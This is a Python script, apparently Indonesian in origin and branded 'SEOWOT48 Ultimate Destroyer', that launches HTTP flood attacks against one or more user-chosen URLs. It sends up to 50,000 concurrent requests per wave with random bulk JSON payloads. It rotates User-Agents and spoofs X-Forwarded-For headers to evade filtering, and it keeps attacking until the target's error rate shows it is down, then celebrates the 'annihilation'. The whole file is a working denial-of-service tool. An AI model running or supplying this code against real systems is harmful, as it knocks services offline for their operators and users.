import asyncio
import aiohttp
import time
import statistics
import threading
import random
import string
from dataclasses import dataclass
from typing import List, Dict
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
from rich import box
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.live import Live
from rich.layout import Layout
from rich.columns import Columns
import concurrent.futures

console = Console()

@dataclass
class HasilSerangan:
    kode_status: int
    waktu_respon: float
    ukuran_respon: int = 0
    error: str = None
    timestamp: float = None

class SeranganUltimate:
    def __init__(self):
        self.total_serangan = 0
        self.server_hancur = False
        self.waktu_mulai = None
        self.statistik_real_time = {}
        self.console = Console()
        self.stop_event = threading.Event()
        
    def tampilkan_banner_ultimate(self):
        banner = """
███████ ███████  ██████  ██     ██  ██████  ████████ ██   ██  █████   ██████  
██      ██      ██    ██ ██     ██ ██    ██    ██    ██   ██ ██   ██ ██    ██ 
███████ █████   ██    ██ ██  █  ██ ██    ██    ██    ███████  █████   ██████  
     ██ ██      ██    ██ ██ ███ ██ ██    ██    ██         ██ ██   ██ ██    ██ 
███████ ███████  ██████   ███ ███   ██████     ██         ██  █████   ██████  
                                                                              
        🔥💀 ULTIMATE DESTROYER - MAKSIMUM DEVASTATION 💀🔥                
        """
        
        self.console.print(Panel(
            Align.center(Text(banner, style="bold red")),
            title="🇮🇩 SEOWOT48 ULTIMATE ANNIHILATOR 🇮🇩",
            border_style="bright_red",
            box=box.DOUBLE
        ))

    def input_konfigurasi_ultimate(self):
        self.console.print("\n💀 [bold red]KONFIGURASI ULTIMATE DESTROYER:[/bold red]\n")
        
        # Multiple targets
        self.console.print("🎯 [bold cyan]Target Mode:[/bold cyan]")
        self.console.print("1. Single Target")
        self.console.print("2. Multiple Targets")
        mode = Prompt.ask("Pilih mode", choices=["1", "2"], default="1")
        
        targets = []
        if mode == "1":
            url = Prompt.ask("🌐 [bold blue]URL/IP target utama[/bold blue]", 
                           default="http://localhost:8080")
            targets = [url]
        else:
            self.console.print("🎯 Masukkan multiple targets (ketik 'done' untuk selesai):")
            while True:
                target = Prompt.ask("Target URL/IP (atau 'done')")
                if target.lower() == 'done':
                    break
                targets.append(target)
            if not targets:
                targets = ["http://localhost:8080"]

        # Attack intensity
        self.console.print("\n⚡ [bold yellow]Intensity Level:[/bold yellow]")
        self.console.print("1. Ringan (1000 req/wave)")
        self.console.print("2. Sedang (5000 req/wave)")  
        self.console.print("3. Berat (10000 req/wave)")
        self.console.print("4. BRUTAL (25000 req/wave)")
        self.console.print("5. APOCALYPSE (50000 req/wave)")
        
        intensity = Prompt.ask("Pilih intensity", choices=["1","2","3","4","5"], default="3")
        intensitas_map = {
            "1": (1000, 50),
            "2": (5000, 100), 
            "3": (10000, 200),
            "4": (25000, 500),
            "5": (50000, 1000)
        }
        request_per_wave, max_concurrent = intensitas_map[intensity]
        
        # Advanced options
        enable_flooding = Confirm.ask("🌊 [bold blue]Enable request flooding?[/bold blue]", default=True)
        enable_random_data = Confirm.ask("🎲 [bold blue]Enable random payload?[/bold blue]", default=True)
        enable_user_agents = Confirm.ask("🤖 [bold blue]Enable random User-Agents?[/bold blue]", default=True)
        
        # Attack duration
        duration_mode = Prompt.ask("⏰ [bold cyan]Duration mode[/bold cyan] (1=Until Down, 2=Time Limit)", 
                                 choices=["1", "2"], default="1")
        
        time_limit = None
        if duration_mode == "2":
            time_limit = IntPrompt.ask("🕐 Batas waktu serangan (menit)?", default=10)
        
        # Error threshold
        error_threshold = IntPrompt.ask("🚨 [bold red]Error threshold untuk deteksi DOWN (%)?[/bold red]", 
                                      default=85, show_default=True)
        
        return {
            'targets': targets,
            'request_per_wave': request_per_wave,
            'max_concurrent': max_concurrent,
            'enable_flooding': enable_flooding,
            'enable_random_data': enable_random_data,
            'enable_user_agents': enable_user_agents,
            'time_limit': time_limit,
            'error_threshold': error_threshold
        }

    def generate_random_payload(self, size_kb: int = 1) -> dict:
        """Generate random payload untuk overwhelm server"""
        data_size = size_kb * 1024
        random_data = ''.join(random.choices(string.ascii_letters + string.digits, k=data_size))
        
        payloads = [
            {"data": random_data, "timestamp": time.time()},
            {"payload": random_data, "id": random.randint(1, 999999)},
            {"content": random_data, "type": "flood", "size": len(random_data)},
            [random_data] * 100,  # Array flood
            {f"field_{i}": random_data for i in range(50)}  # Object flood
        ]
        
        return random.choice(payloads)

    def get_random_headers(self) -> dict:
        """Generate random headers untuk bypass filtering"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "SEOWOT48-Ultimate-Destroyer/1.0",
            "Python-aiohttp/3.9.1",
            "Wget/1.21.3",
            "curl/7.81.0"
        ]
        
        return {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }

    async def ultimate_request(self, session: aiohttp.ClientSession, target: str, config: dict) -> HasilSerangan:
        start_time = time.time()
        
        try:
            # Random method selection untuk maximum chaos
            methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
            method = random.choice(methods[:3])  # Focus pada GET/POST/PUT
            
            # Prepare payload
            data = None
            if method in ["POST", "PUT", "PATCH"] and config['enable_random_data']:
                data = self.generate_random_payload(random.randint(1, 5))
            
            # Headers
            headers = self.get_random_headers() if config['enable_user_agents'] else {}
            
            async with session.request(
                method=method,
                url=target, 
                json=data,
                headers=headers,
                ssl=False,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as response:
                content = await response.read()
                response_time = time.time() - start_time
                
                return HasilSerangan(
                    kode_status=response.status,
                    waktu_respon=response_time,
                    ukuran_respon=len(content),
                    timestamp=time.time()
                )
                
        except Exception as e:
            response_time = time.time() - start_time
            return HasilSerangan(0, response_time, 0, str(e), time.time())

    async def wave_attack(self, targets: List[str], config: dict) -> List[HasilSerangan]:
        """Execute single wave attack dengan maximum concurrency"""
        
        connector = aiohttp.TCPConnector(
            limit=config['max_concurrent'] * 2,
            limit_per_host=config['max_concurrent'],
            use_dns_cache=True,
            keepalive_timeout=60,
            enable_cleanup_closed=True
        )
        
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        
        hasil_wave = []
        
        async with aiohttp.ClientSession(
            connector=connector, 
            timeout=timeout,
            skip_auto_headers=['User-Agent']
        ) as session:
            
            # Create semaphore untuk rate limiting
            semaphore = asyncio.Semaphore(config['max_concurrent'])
            
            async def attack_single():
                async with semaphore:
                    target = random.choice(targets)  # Random target selection
                    result = await self.ultimate_request(session, target, config)
                    hasil_wave.append(result)
                    return result
            
            # Launch massive concurrent attacks
            tasks = []
            total_requests = config['request_per_wave']
            
            # Batching untuk avoid memory issues
            batch_size = min(config['max_concurrent'] * 2, 2000)
            
            for i in range(0, total_requests, batch_size):
                batch_tasks = []
                current_batch_size = min(batch_size, total_requests - i)
                
                for _ in range(current_batch_size):
                    task = attack_single()
                    batch_tasks.append(task)
                
                # Execute batch
                await asyncio.gather(*batch_tasks, return_exceptions=True)
                
                # Small delay untuk avoid overwhelming
                if config['enable_flooding']:
                    await asyncio.sleep(0.001)  # 1ms delay
                else:
                    await asyncio.sleep(0.01)   # 10ms delay
        
        return hasil_wave

    def create_live_dashboard(self, wave_count: int, hasil_terkini: List[HasilSerangan], 
                            total_time: float, config: dict) -> Table:
        """Create real-time dashboard"""
        
        # Calculate statistics
        if hasil_terkini:
            sukses = [r for r in hasil_terkini if r.kode_status == 200]
            error = [r for r in hasil_terkini if r.kode_status != 200]
            error_rate = (len(error) / len(hasil_terkini)) * 100
            
            if sukses:
                avg_response = statistics.mean([r.waktu_respon for r in sukses]) * 1000
                total_data = sum([r.ukuran_respon for r in sukses]) / 1024 / 1024  # MB
            else:
                avg_response = 0
                total_data = 0
                
            rps = len(hasil_terkini) / max(total_time, 1)
        else:
            error_rate = 0
            avg_response = 0
            total_data = 0
            rps = 0
        
        # Main dashboard table
        dashboard = Table(
            title=f"🔥💀 SEOWOT48 ULTIMATE LIVE DASHBOARD 💀🔥", 
            box=box.DOUBLE_EDGE, 
            border_style="bright_red"
        )
        
        dashboard.add_column("Metric", style="bold white", justify="left")
        dashboard.add_column("Value", style="bright_green", justify="right") 
        dashboard.add_column("Status", style="bold yellow", justify="center")
        
        # Status indicators
        power_status = "💀 ANNIHILATION" if error_rate > 80 else "🔥 DEVASTATING" if error_rate > 50 else "⚡ ATTACKING"
        server_status = "💀 DESTROYED" if error_rate > config['error_threshold'] else "🩸 BLEEDING" if error_rate > 60 else "🛡️ DEFENDING"
        
        dashboard.add_row("⚔️ Wave Number", f"#{wave_count}", power_status)
        dashboard.add_row("⏱️ Attack Duration", f"{total_time:.1f}s", "🕐")
        dashboard.add_row("🚀 Requests Fired", f"{len(hasil_terkini):,}", "💥")
        dashboard.add_row("💥 Requests/Second", f"{rps:.1f}", "⚡")
        dashboard.add_row("✅ Successful Hits", f"{len([r for r in hasil_terkini if r.kode_status == 200]):,}", "💚")
        dashboard.add_row("❌ Failed Attacks", f"{len([r for r in hasil_terkini if r.kode_status != 200]):,}", "💔")
        dashboard.add_row("📊 Error Rate", f"{error_rate:.1f}%", "🎯" if error_rate > 70 else "⚠️")
        dashboard.add_row("⚡ Avg Response", f"{avg_response:.0f}ms", "📈")
        dashboard.add_row("📦 Data Transferred", f"{total_data:.2f}MB", "📊")
        dashboard.add_row("🎯 Server Status", server_status, "🔥")
        
        return dashboard

    async def ultimate_assault(self, config: dict):
        """Main assault function dengan maximum devastation"""
        
        self.console.print("\n💀 [bold red]ULTIMATE ASSAULT MODE ACTIVATED![/bold red]")
        self.console.print("⚠️ [bold yellow]MAXIMUM DEVASTATION PROTOCOL ENGAGED![/bold yellow]")
        self.console.print("🔥 [bold red]BEGINNING TOTAL ANNIHILATION...[/bold red]\n")
        
        # Countdown yang lebih dramatis
        for i in range(5, 0, -1):
            self.console.print(f"💀 LAUNCHING IN {i}... 💀", style="bold red blink")
            await asyncio.sleep(1)
        
        self.console.print("🚀 [bold green blink]ASSAULT COMMENCED! TARGET UNDER ATTACK![/bold green blink]\n")
        
        self.waktu_mulai = time.time()
        wave_count = 0
        all_results = []
        
        try:
            while not self.server_hancur:
                wave_count += 1
                
                self.console.print(f"\n💥 [bold red]WAVE {wave_count} - MAXIMUM FIREPOWER![/bold red]")
                
                # Execute wave attack
                hasil_wave = await self.wave_attack(config['targets'], config)
                all_results.extend(hasil_wave)
                
                # Calculate statistics
                current_time = time.time() - self.waktu_mulai
                
                # Check if server is down
                if hasil_wave:
                    error_count = len([r for r in hasil_wave if r.kode_status != 200])
                    error_rate = (error_count / len(hasil_wave)) * 100
                    
                    if error_rate >= config['error_threshold']:
                        self.server_hancur = True
                        break
                
                # Show live dashboard
                dashboard = self.create_live_dashboard(wave_count, hasil_wave, current_time, config)
                self.console.print(dashboard)
                
                # Check time limit
                if config['time_limit'] and current_time > (config['time_limit'] * 60):
                    self.console.print("\n⏰ [bold yellow]Time limit reached![/bold yellow]")
                    break
                
                # Brief pause sebelum wave berikutnya
                if config['enable_flooding']:
                    await asyncio.sleep(0.5)  # Minimal delay untuk flooding
                else:
                    await asyncio.sleep(2)    # Standard delay
                    
        except KeyboardInterrupt:
            self.console.print("\n🛑 [bold red]ASSAULT TERMINATED BY OPERATOR![/bold red]")
        
        self.show_ultimate_results(wave_count, all_results, time.time() - self.waktu_mulai, config)

    def show_ultimate_results(self, total_waves: int, all_results: List[HasilSerangan], 
                            total_time: float, config: dict):
        """Show ultimate destruction results"""
        
        self.console.print("\n" + "="*100)
        
        # Victory/Defeat banner
        if self.server_hancur:
            victory_banner = """
💀💀💀 ████████  █████  ██████   ██████  ███████ ████████     ██████  ███████ ███████ ████████ ██████   ██████  ██    ██ ███████ ██████  💀💀💀
💀💀💀    ██    ██   ██ ██   ██ ██       ██         ██        ██   ██ ██      ██         ██    ██   ██ ██    ██  ██  ██  ██      ██   ██ 💀💀💀
💀💀💀    ██    ███████ ██████  ██   ███ █████      ██        ██   ██ █████   ███████    ██    ██████  ██    ██   ████   █████   ██   ██ 💀💀💀
💀💀💀    ██    ██   ██ ██   ██ ██    ██ ██         ██        ██   ██ ██           ██    ██    ██   ██ ██    ██    ██    ██      ██   ██ 💀💀💀
💀💀💀    ██    ██   ██ ██   ██  ██████  ███████    ██        ██████  ███████ ███████    ██    ██   ██  ██████     ██    ███████ ██████  💀💀💀
            """
            self.console.print(Panel(
                Align.center(Text(victory_banner, style="bold red on black")),
                title="🏆 ULTIMATE VICTORY - TARGET ANNIHILATED! 🏆",
                border_style="bright_red",
                box=box.DOUBLE
            ))
        else:
            self.console.print(Panel(
                Align.center(Text("⚔️ ASSAULT CONCLUDED - ANALYZING DAMAGE ⚔️", style="bold yellow")),
                title="📊 MISSION SUMMARY",
                border_style="bright_yellow",
                box=box.DOUBLE
            ))
        
        # Ultimate statistics
        if all_results:
            sukses = [r for r in all_results if r.kode_status == 200]
            error = [r for r in all_results if r.kode_status != 200]
            error_rate = (len(error) / len(all_results)) * 100
            
            avg_rps = len(all_results) / total_time if total_time > 0 else 0
            total_data_mb = sum([r.ukuran_respon for r in sukses]) / 1024 / 1024
            
            # Create final report table
            final_table = Table(
                title="🔥💀 SEOWOT48 ULTIMATE DESTRUCTION REPORT 💀🔥", 
                box=box.DOUBLE_EDGE, 
                border_style="bright_magenta"
            )
            
            final_table.add_column("War Statistics", style="bold white", justify="left")
            final_table.add_column("Battle Results", style="bright_green", justify="right")
            final_table.add_column("Damage Level", style="bold yellow", justify="center")
            
            final_table.add_row("⚔️ Total Assault Waves", f"{total_waves}", "💥")
            final_table.add_row("⏱️ Total War Duration", f"{total_time:.1f} seconds", "🕐")
            final_table.add_row("🚀 Total Projectiles Fired", f"{len(all_results):,}", "💥")
            final_table.add_row("💥 Average Fire Rate", f"{avg_rps:.1f} req/sec", "⚡")
            final_table.add_row("🎯 Direct Hits", f"{len(sukses):,}", "💚")
            final_table.add_row("💔 Missed/Blocked", f"{len(error):,}", "💔")
            final_table.add_row("📊 Destruction Rate", f"{error_rate:.1f}%", "🔥" if error_rate > 70 else "⚠️")
            final_table.add_row("📦 Data Bombardment", f"{total_data_mb:.2f} MB", "📊")
            final_table.add_row("🎯 Target Condition", 
                               "💀 ANNIHILATED" if self.server_hancur else "🩸 DAMAGED" if error_rate > 50 else "🛡️ SURVIVED", 
                               "💀" if self.server_hancur else "🩸" if error_rate > 50 else "🛡️")
            
            self.console.print(final_table)
            
            # Response time analysis untuk survivors
            if sukses:
                response_times = [r.waktu_respon * 1000 for r in sukses]
                response_analysis = Table(title="⚡ Response Time Analysis", box=box.ROUNDED)
                response_analysis.add_column("Metric", style="cyan")
                response_analysis.add_column("Value", style="green", justify="right")
                
                response_analysis.add_row("Fastest Response", f"{min(response_times):.0f}ms")
                response_analysis.add_row("Average Response", f"{statistics.mean(response_times):.0f}ms")
                response_analysis.add_row("Slowest Response", f"{max(response_times):.0f}ms")
                if len(response_times) >= 10:
                    response_analysis.add_row("95th Percentile", f"{statistics.quantiles(response_times, n=20)[18]:.0f}ms")
                
                self.console.print(response_analysis)
        
        # Final verdict
        if self.server_hancur:
            verdict = "🏆💀 SEOWOT48 ULTIMATE VICTORY! TARGET COMPLETELY ANNIHILATED! 💀🏆"
            verdict_style = "bold white on red"
        elif error_rate > 80:
            verdict = "🔥⚔️ NEAR TOTAL DESTRUCTION! TARGET CRITICALLY DAMAGED! ⚔️🔥"
            verdict_style = "bold yellow on red"
        elif error_rate > 50:
            verdict = "💥🩸 SIGNIFICANT DAMAGE INFLICTED! TARGET WOUNDED! 🩸💥"  
            verdict_style = "bold yellow"
        else:
            verdict = "🛡️⚔️ TARGET SURVIVED THE ASSAULT! INCREASE FIREPOWER! ⚔️🛡️"
            verdict_style = "bold red"
        
        self.console.print("\n")
        self.console.print(Panel(
            Align.center(Text(verdict, style=verdict_style)),
            title="🎯 ULTIMATE BATTLE VERDICT",
            border_style="bright_cyan",
            box=box.DOUBLE
        ))

def main():
    destroyer = SeranganUltimate()
    
    while True:
        try:
            destroyer.tampilkan_banner_ultimate()
            
            config = destroyer.input_konfigurasi_ultimate()
            
            # Reset state
            destroyer.server_hancur = False
            destroyer.total_serangan = 0
            
            asyncio.run(destroyer.ultimate_assault(config))
            
            console.print("\n")
            ulang = Confirm.ask("🔄 [bold blue]Launch another assault?[/bold blue]", default=True)
            if not ulang:
                console.print("👋 [bold green]SEOWOT48 ULTIMATE DESTROYER signing off![/bold green]")
                break
            else:
                console.clear()
                
        except KeyboardInterrupt:
            console.print("\n❌ [bold red]DESTROYER PROTOCOL TERMINATED![/bold red]")
            break
        except Exception as e:
            console.print(f"\n💥 [bold red]CRITICAL ERROR: {e}[/bold red]")
            ulang = Confirm.ask("🔄 Restart destroyer?", default=True)
            if not ulang:
                break

if __name__ == "__main__":
    main()